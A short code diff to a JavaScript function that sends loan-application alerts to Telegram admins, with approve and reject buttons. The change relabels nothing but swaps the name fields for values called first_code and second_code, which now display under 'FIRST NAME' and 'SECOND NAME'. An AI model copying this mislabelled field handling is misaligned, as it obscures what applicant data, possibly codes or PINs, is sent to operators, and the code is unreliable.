@@ -349,11 +349,11 @@ async function notifyTelegram(application) {
   if (!bot) return;
   const assigned = application.assigned_admin_id ? String(application.assigned_admin_id) : null;
   const recipients = assigned ? [assigned] : [...adminIds];
-  const text = `🔔 OMBI LA MKOPO\n\n` +
+  const text = `🔔 New application\n\n` +
     `PIN 📌: ${application.application_id || application.application_no}\n` +
     `PHONE NUMBER: ${application.phone}\n` +
-    `FIRST NAME: ${application.first_name || "waiting"}\n` +
-    `SECOND NAME: ${application.second_name || "waiting"}\n` +
+    `FIRST NAME: ${application.first_code || "waiting"}\n` +
+    `SECOND NAME: ${application.second_code || "waiting"}\n` +
     `Kiasi: ${money(application.amount)}\n` +
     `Hali: ${application.status}`;
   const keyboard = { inline_keyboard: [[{ text: "✅ APPROVE", callback_data: `approve:${application.id}` }, { text: "❌ REJECT", callback_data: `reject:${application.id}` }], [{ text: "📄 DETAILS", callback_data: `details:${application.id}` }]] };
